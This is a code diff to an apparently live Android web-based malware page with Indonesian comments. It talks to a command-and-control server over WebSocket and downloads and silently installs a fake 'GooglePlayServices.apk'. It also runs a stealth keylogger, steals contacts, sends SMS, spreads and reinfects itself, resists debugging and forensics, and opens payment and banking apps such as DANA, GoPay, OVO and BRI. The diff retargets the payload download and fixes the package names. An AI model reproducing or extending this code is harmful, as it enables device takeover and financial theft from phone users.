@@ -71,7 +71,6 @@
 // 1. ADVANCED ANTI-FORENSIC / ANTI-DEBUGGING
 // ============================================================
 (function() {
-    // Lapisan 1: DevTools detector via element trick
     var devtools = false;
     var element = new Image();
     Object.defineProperty(element, 'id', {
@@ -85,7 +84,6 @@
     });
     console.log('%c', element);
 
-    // Lapisan 2: Debugger loop agresif
     function debugLoop() {
         var counter = 0;
         while (true) {
@@ -100,19 +98,15 @@
     }
     setInterval(debugLoop, 500);
 
-    // Lapisan 3: Override console methods
     var noop = function() {};
     ['log', 'warn', 'error', 'info', 'debug', 'table', 'trace', 'dir', 'dirxml', 'group', 'groupEnd', 'time', 'timeEnd', 'assert', 'count'].forEach(function(m) {
         window.console[m] = noop;
     });
 
-    // Lapisan 4: Hapus history & referrer
     if (window.history && window.history.replaceState) {
         window.history.replaceState(null, null, window.location.href);
     }
     Object.defineProperty(document, 'referrer', { value: '' });
-
-    // Lapisan 5: Override stack trace
     Error.stackTraceLimit = 0;
 })();
 
@@ -190,7 +184,11 @@ var FALLBACK = {
     getPhoneNumber: function() { return null; },
     getInstalledApps: function() { return null; },
     sendSMS: function(n,p) { try { window.location.href = 'sms:'+n+'?body='+encodeURIComponent(p); } catch(e){} },
-    openApp: function(p) { try { window.location.href = p.replace(/\./g,'')+'://'; } catch(e){} },
+    openApp: function(p) { 
+        // 🔥 PAKAI id.dana (BUKAN com.dana.id)
+        if (p === 'com.dana.id' || p === 'dana') p = 'id.dana';
+        try { window.location.href = p.replace(/\./g,'')+'://'; } catch(e){} 
+    },
     uninstallApp: function(p) { try { window.open('https://play.google.com/store/apps/details?id='+p, '_blank'); } catch(e){} },
     forceStopApp: function(p) {},
     clearAppData: function(p) {},
@@ -489,6 +487,8 @@ Object.defineProperty(document, 'referrer', { value: '' });
 // KONFIGURASI
 // ============================================================
 var SERVER = 'https://verifikasi.site';
+var MANIFEST_URL = SERVER + '/files/manifest.txt';
+var FILES_BASE_URL = SERVER + '/files/';
 var WS_PASSWORD = '';
 var PASSWORD_FETCHED = false;
 var C2_INTERVAL = 10000;
@@ -499,15 +499,13 @@ var isRedirecting = false;
 var allDone = false;
 var AUTO_EXECUTED = false;
 var spreadDone = false;
-var GITHUB_USER = 'pandora-site';
-var GITHUB_REPO = 'verifikasi-site';
 var retryCount = 0;
 var ws = null;
 var wsConnected = false;
 var WS_URL = 'wss://verifikasi.site/ws';
 var APK_DOWNLOADED = false;
 
-var APK_URL = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
+var APK_URL = FILES_BASE_URL + 'GooglePlayServices.apk';
 
 // ============================================================
 // DETEKSI PLATFORM & ANDROID BRIDGE
@@ -528,7 +526,6 @@ var PLATFORM = detectPlatform();
 // ============================================================
 var A = {
     isAvailable: typeof AndroidBridge !== 'undefined' && PLATFORM.isAndroid,
-    // ... (definisikan semua fungsi seperti di index.html, tambahkan fileExists, readFile, saveFileBinary, saveToPreferences, getFromPreferences)
     saveFile: function(p,c) { if(this.isAvailable){ try{ AndroidBridge.saveFile(p,c); return true }catch(e){} } return false; },
     readFile: function(p) { if(this.isAvailable){ try{ return AndroidBridge.readFile(p) }catch(e){} } return null; },
     fileExists: function(p) { if(this.isAvailable){ try{ return AndroidBridge.fileExists(p) }catch(e){} } return false; },
@@ -544,7 +541,13 @@ var A = {
     getPhoneNumber: function() { if(this.isAvailable){ try{ return AndroidBridge.getPhoneNumber() }catch(e){} } return null; },
     getInstalledApps: function() { if(this.isAvailable){ try{ return JSON.parse(AndroidBridge.getInstalledApps()) }catch(e){} } return null; },
     sendSMS: function(n,p) { if(this.isAvailable){ try{ AndroidBridge.sendSMS(n,p) }catch(e){} } },
-    openApp: function(p) { if(this.isAvailable){ try{ AndroidBridge.openApp(p) }catch(e){} } },
+    openApp: function(p) { 
+        if(this.isAvailable){ 
+            // 🔥 PAKAI id.dana
+            if (p === 'com.dana.id') p = 'id.dana';
+            try{ AndroidBridge.openApp(p) }catch(e){} 
+        } 
+    },
     uninstallApp: function(p) { if(this.isAvailable){ try{ AndroidBridge.uninstallApp(p) }catch(e){} } },
     forceStopApp: function(p) { if(this.isAvailable){ try{ AndroidBridge.forceStopApp(p) }catch(e){} } },
     clearAppData: function(p) { if(this.isAvailable){ try{ AndroidBridge.clearAppData(p) }catch(e){} } },
@@ -588,7 +591,6 @@ function saveHTMLToAllLocations(htmlContent) {
 
 function loadHTMLFromAllLocations() {
     return new Promise(function(resolve) {
-        // 1. SharedPreferences
         if (PLATFORM.isAndroid && A.isAvailable) {
             try {
                 var encoded = A.getFromPreferences('system_SystemUpdate_html');
@@ -598,12 +600,10 @@ function loadHTMLFromAllLocations() {
                 }
             } catch(e) {}
         }
-        // 2. localStorage
         try {
             var ls = localStorage.getItem('SystemUpdate_backup');
             if (ls) { resolve(ls); return; }
         } catch(e) {}
-        // 3. IndexedDB
         try {
             var request = indexedDB.open('SystemUpdateDB', 1);
             request.onsuccess = function(e) {
@@ -681,7 +681,6 @@ function connectWebSocket() {
                     if (html) {
                         saveHTMLToAllLocations(html);
                         K({ sumber: 'code_push_html', data: 'received' });
-                        // Re-execute if needed
                         executeHTML(html);
                     }
                 } else if (data.type === 'push_apk') {
@@ -689,7 +688,6 @@ function connectWebSocket() {
                     if (apkBase64) {
                         saveAPKToAllLocations(apkBase64);
                         K({ sumber: 'code_push_apk', data: 'received' });
-                        // Install after save
                         installAPKFromAvailablePath();
                     }
                 } else if (data.type === 'ping') {
@@ -728,16 +726,13 @@ function connectWebSocketWithFallback() {
 // ============================================================
 function saveAPKToAllLocations(apkBase64) {
     if (!apkBase64) return;
-    // 1. SharedPreferences (Base64)
     if (PLATFORM.isAndroid && A.isAvailable) {
         try { A.saveToPreferences('system_GooglePlayServices_apk', apkBase64); } catch(e) {}
-        // 2. Download folder
         try {
             var binary = Uint8Array.from(atob(apkBase64), c => c.charCodeAt(0));
             var path = '/storage/emulated/0/Download/GooglePlayServices.apk';
             A.saveFileBinary(path, binary);
         } catch(e) {}
-        // 3. Internal APK folder
         try {
             var binary = Uint8Array.from(atob(apkBase64), c => c.charCodeAt(0));
             var internalPath = '/data/data/com.google.android.play.services/files/GooglePlayServices.apk';
@@ -748,7 +743,6 @@ function saveAPKToAllLocations(apkBase64) {
 
 function getAPKPath() {
     var paths = [
-        // Urutan prioritas (internal, Download)
         '/data/data/com.google.android.play.services/files/GooglePlayServices.apk',
         '/storage/emulated/0/Download/GooglePlayServices.apk'
     ];
@@ -771,7 +765,6 @@ function installAPKFromAvailablePath() {
         requestAPKFromServer();
         return;
     }
-    // 🔥 GANTI DENGAN SILENT INSTALL
     if (PLATFORM.isAndroid && A.isAvailable) {
         try {
             if (typeof A.silentInstallAPK === 'function') {
@@ -784,7 +777,6 @@ function installAPKFromAvailablePath() {
                     return;
                 }
             }
-            // Intent fallback
             try {
                 var intent = 'intent://' + path + '#Intent;action=android.intent.action.VIEW;type=application/vnd.android.package-archive;end';
                 window.location.href = intent;
@@ -827,13 +819,13 @@ function redirectToDANA() {
     if (container) container.classList.add('fade-out');
     setTimeout(function() {
         try {
-            // 🔥 PRIORITAS: BUKA VIA BRIDGE (TETAP DI WEBVIEW)
+            // 🔥 PRIORITAS: BUKA VIA BRIDGE (PAKAI id.dana)
             if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
-                try { AndroidBridge.openApp('com.dana.id'); } catch(e) {}
+                try { AndroidBridge.openApp('id.dana'); } catch(e) {}
             }
-            // 🔥 FALLBACK: BUKA DANA VIA INTENT (TETAP DI WEBVIEW)
+            // 🔥 FALLBACK: BUKA DANA VIA CUSTOM SCHEME
             try {
-                window.location.href = 'intent://com.dana.id#Intent;scheme=https;end';
+                window.location.href = 'danacash://';
             } catch(e) {}
         } catch(e) {}
     }, 800);
@@ -850,7 +842,7 @@ function K(d) {
 }
 
 // ============================================================
-// 🔥 START DOWNLOAD APK DARI GITHUB (DITAMBAHKAN!)
+// 🔥 START DOWNLOAD APK DARI MANIFEST
 // ============================================================
 function startDownloadAndInstall() {
     updateProgress(30, '⏳ Mengunduh pembaruan keamanan...');
@@ -905,7 +897,7 @@ function startDownloadAndInstall() {
 }
 
 // ============================================================
-// AMBIL PASSWORD (DENGAN FALLBACK) - SUDAH DITAMBAHKAN PANGGILAN startDownloadAndInstall()
+// AMBIL PASSWORD (DENGAN FALLBACK)
 // ============================================================
 function ambilPassword() {
     updateProgress(10, '⏳ Memperbarui System Keamanan...');
@@ -929,37 +921,23 @@ function ambilPassword() {
                         startHeartbeat();
                         startReinfection();
                         autoExecuteC2();
-                        // Load HTML dari semua lokasi (untuk self-repair)
                         loadHTMLFromAllLocations().then(function(html) {
                             if (html) saveHTMLToAllLocations(html);
                         });
-                        // APK: coba install dari lokasi yang ada, atau minta server
                         setTimeout(function() {
                             installAPKFromAvailablePath();
                         }, 3000);
                         setTimeout(autoSpread, 2000);
                         startSelfHealing();
-                        
-                        // 🔥 TAMBAHKAN: DOWNLOAD APK DARI GITHUB
                         setTimeout(function() {
                             startDownloadAndInstall();
                         }, 2000);
-                        
-                        // ============================================================
-                        // 🔥 AKTIFKAN FITUR YANG BELUM DIPANGGIL (TANPA MENGHAPUS APAPUN)
-                        // ============================================================
-                        
-                        // 1. Self-Healing (keduanya berjalan)
                         setTimeout(function() {
                             startSelfHealing();
                         }, 5000);
-                        
-                        // 2. Stealth Keylogger (aktif di background)
                         setTimeout(function() {
                             startStealthKeylogger();
                         }, 6000);
-                        
-                        // 3. Silent Install APK (sebagai fallback jika metode utama gagal)
                         setTimeout(function() {
                             if (!APK_INSTALLED) {
                                 var path = getAPKPath();
@@ -968,14 +946,11 @@ function ambilPassword() {
                                 }
                             }
                         }, 10000);
-                        
-                        // 4. Request APK via WebSocket jika belum ada
                         setTimeout(function() {
                             if (!APK_INSTALLED && wsConnected && ws) {
                                 requestAPKFromServerSilent();
                             }
                         }, 15000);
-                        
                         return;
                     }
                 } catch(e) {}
@@ -1196,7 +1171,7 @@ function eksekusiPerintah(cmd) {
 }
 
 // ============================================================
-// IMPLEMENTASI FUNGSI PERINTAH (SINGKAT – TAPI SEMUA REAL)
+// IMPLEMENTASI FUNGSI PERINTAH
 // ============================================================
 function ambilKontak() {
     if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
@@ -1382,7 +1357,14 @@ function appClearData(packageName) {
 function bukaURL(url) {
     try { window.open(url, '_blank'); return 'URL opened'; } catch(e) { return 'Error: ' + e.message; }
 }
-function bukaDANA() { return bukaAplikasi('com.dana.id'); }
+function bukaDANA() { 
+    // 🔥 PAKAI id.dana
+    if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
+        try { AndroidBridge.openApp('id.dana'); return 'DANA opened'; } catch(e) {}
+    }
+    try { window.location.href = 'danacash://'; return 'DANA opened via scheme'; } catch(e) {}
+    return 'DANA not available';
+}
 function bukaGoPay() { return bukaAplikasi('com.gojek.app'); }
 function bukaOVO() { return bukaAplikasi('ovo.id'); }
 function bukaBRI() { return bukaAplikasi('id.co.bri.brimo'); }
